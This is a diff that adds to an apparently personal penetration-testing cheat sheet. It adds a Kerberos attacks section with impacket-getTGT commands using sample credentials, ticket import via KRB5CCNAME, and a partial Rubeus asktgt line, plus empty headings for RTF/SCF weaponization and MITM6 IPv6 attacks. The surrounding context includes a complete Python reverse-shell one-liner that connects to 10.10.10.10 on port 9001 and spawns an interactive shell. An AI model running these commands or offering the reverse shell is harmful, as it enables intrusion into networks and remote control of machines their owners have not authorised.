@@ -142,6 +142,49 @@ Get-LoggedOnLocal [-ComputerName <comp_name>]
 ```
 
 <br>
+## Kerberos Attacks
+<br>
+<span class="demo-highlight"># working from linux with creds</span>
+
+
+````powershell
+# username : rat
+# password : r@tty419
+# domain : rodent.local
+impacket-getTGT rodent.local/rat:'r@tty419'
+
+
+# now import the ticket into memory
+export KRB5CCNAME=/tmp/rat.ccache
+
+# confirm the ticket in memory 
+klist
+````
+<br>
+<br>
+<span class="demo-highlight"># working from windows with creds</span>
+````powershell
+# Using Rubeus
+
+./Rubeus.exe asktgt 
+````
+
+<br>
+<br>
+## RTF && SCF Weaponization
+
+<br>
+<br>
+<br>
+
+# MITM6 IPV6 Attack
+
+<br>
+<br>
+<br>
+
+
+
 
 ```python
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
